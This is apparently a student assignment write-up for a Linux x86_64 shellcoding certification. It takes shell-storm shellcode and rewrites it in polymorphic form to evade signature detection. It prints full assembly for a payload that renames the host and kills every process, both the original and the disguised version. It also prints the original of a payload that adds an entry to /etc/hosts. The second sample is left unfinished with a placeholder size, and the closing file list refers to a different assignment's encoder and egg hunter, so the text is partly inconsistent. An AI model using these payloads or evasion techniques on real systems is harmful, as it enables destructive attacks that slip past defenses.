## Assignment #6: Polymorphing
---
---
### Introduction
---
This assignment consists of taking three shellcode samples from shell-storm.org for Linux x86_64 and create polymorphic examples that are no larger than 150% the original size.

The goal of this task is to mimic the same original functionality, but to beat pattern matching techniques that could be used to fingerprint the payload.

Below are the three samples choosen with their original code and the polymorphic version with brief explanations on what has been done.

### Sample 1: `sethostname() & killall 33 bytes shellcode`
---

* Shellcode Name: Linux/x86_64 sethostname() & killall 33 bytes shellcode
* Author: zbt
* URL: [http://shell-storm.org/shellcode/files/shellcode-605.php](http://shell-storm.org/shellcode/files/shellcode-605.php)
* Description: Changes the name of the host to "Rooted!" and then kills all processes running on the system
* Original Shellcode Size: 33 bytes
* Max Size of the polymorphic Version: 49 bytes
* Size of the Created Polymorphic Version: **46 bytes (below the 150%)**

The original code for the sample is:

```asm
    section .text
        global _start
 
    _start:
 
        ;-- setHostName("Rooted !"); 22 bytes --;
        mov     al, 0xaa
        mov     r8, 'Rooted !'
        push    r8
        mov     rdi, rsp
        mov     sil, 0x8
        syscall
 
        ;-- kill(-1, SIGKILL); 11 bytes --;
        push    byte 0x3e
        pop     rax
        push    byte 0xff
        pop     rdi
        push    byte 0x9
        pop     rsi
        syscall
```

The Polymorphic version created is (comments of changes in the code):

```asm
global _start

section .text

_start:

        jmp real_start
        string: db "Rooted !"

real_start:

        ;-- setHostName("Rooted !"); 22 bytes --;
        ;mov     al, 0xaa
        ; RAX needs the 0xaa value.
        ; 1.- First RAX will take value 70
        ; 2.- Value 100 is added to rax
        ; 3.- RDX is used to pur some garbage in the shellcode
        push 70
        pop rax
        cdq                        ; Garbage (1 byte
        push 100
        pop rdx
        add rax, rdx

        ; Let's define a string and use Relative Addressing
        ;mov     r8, 'Rooted !'
        ;push    r8
        ;mov     rdi, rsp
        lea rdi, [rel string]

        ;mov     sil, 0x8
        push 0x08
        pop rsi

        syscall

        ;-- kill(-1, SIGKILL); 11 bytes --;
        push    byte 0x3e
        pop     rax
        
        ; Let's push 0xc1 into RDI
        ; Then add RAX to RDI
        ; 0xff = 0x3e + 0xc1
        ;push    byte 0xff
        ;pop     rdi
        push byte 0xc1
        pop rdi
        add rdi, rax                    ; RAX already has 0x3e value

        ; RSI comes with a 0x08 value from previous code
        ; Just need to Inc it to get the 0x09 value
        ;push    byte 0x9
        ;pop     rsi
        inc rsi                         ; RSI has value 0x8 from previous
                                        ;  syscall, then can increment 1
                                        ;  to get the same value of 0x9
        syscall
```
Changes made:
1. A 8 bytes string is defined for storing the `"Rooted !"` instead of doing it in the stack. This **adds 10 bytes** to the shellcode and forces us to:
  - Add a `jmp` to a real start label to bypass the string
  - Use Relative Addressing later to reference to this string, and 
```asm
_start:
        jmp real_start
        string: db "Rooted !"
real_start:
```
2. In the original code, RAX needs the value `0xaa`. To acomplish the same result the code is changed adding several instructions to get the same result. With this change, from 2 bytes of size for the original `mov`, size is increased to 10 bytes (2 extra bytes used):
```asm

                                   push 0x46
                                   pop rax
mov al, 0xaa       ==>>            cdq
                                   push 0x64
                                   pop rdx
                                   add rax, rdx       ; Here RAX is 0xaa
```
3. In the original code, the '"Rooted !" string is saved in the stack, and RDI gets the address in the stack for this string. As the string has been defined as a variable, now can be accessed using relative addressing. The original code was 15 bytes, and with the change now is 7 bytes (saved 8 bytes here).
```asm
movabs r8,"Rooted !"
push r8                    ==>      lea rdi, [rel string]
mov rdi, rsp
```
4. Replace `mov` by `push;pop` instructions. Here RSI needs the value `0x08`. In the new code, the value is pushed in the stack and then poped in RSI:
```asm
mov sil, 0x08              ==>        push 0x08
                                      pop rsi
```
5. Replace the `push;pop` instructions to put `0xff` value in RDI. As RAX has value at this point of `0x3e` we add the value `0xc1` to RDI and add an instruction to sum both values into RDI:
```asm
push 0x3e                push 0x3e
pop rax                  pop rax
push 0xff    ==>         push 0xc1
pop rdi                  pop rdi
                         add rdi, rax
```
6. As RSI already has value `0x08` from before, and now requires `0x09` value, just need to increment it. Then the `mov` is replaced by a ìnc`
```asm
push 0x09
pop rsi        ==>       inc rsi
```

### Sample 2: 
---

* Shellcode Name: Add map in /etc/hosts file
* Author: Osanda (@OsandaMalith)
* URL: [http://shell-storm.org/shellcode/files/shellcode-896.php](http://shell-storm.org/shellcode/files/shellcode-896.php)
* Description: Adds entry in the `/etc/hosts` file
* Original Shellcode Size: 110 bytes
* Max Size of the polymorphic Version: 165 bytes
* Size of the Created Polymorphic Version: **XXX bytes (below the 150%)**

The original ASM file:
```asm
global _start
    section .text

_start:
    ;open
    xor rax, rax 
    add rax, 2  ; open syscall
    xor rdi, rdi
    xor rsi, rsi
    push rsi ; 0x00 
    mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r10, 0x7374736f682f2f2f ; /cte/
    push r10
    push r8
    add rdi, rsp
    xor rsi, rsi
    add si, 0x401
    syscall

    ;write
    xchg rax, rdi
    xor rax, rax
    add rax, 1 ; syscall for write
    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

    ;close
    xor rax, rax
    add rax, 3
    syscall

    ;exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'
```

Once applied polymorphic techniques, the code changes to:






### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment04) for this assignment contains the following files:

- [Encoder.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Encoder.c) : This C file is the implementation of the Encoder Scheme. Prints out a encoded shellcode.
- [Decode-Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Decode-Execve-Stack.nasm) : This is the NULL free code for the Egg Hunter.
- [Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment4/ReverseShell-ExecveStack_V2.nasm) : This is the code for the shellcode to use in the PoC.
- [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/shellcode.c) : The C template Decode-Execve-Stack.nasm Shellcode, ready to compile and execute


### The End
---
This pages have been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html).

Student ID: PA-14628
 
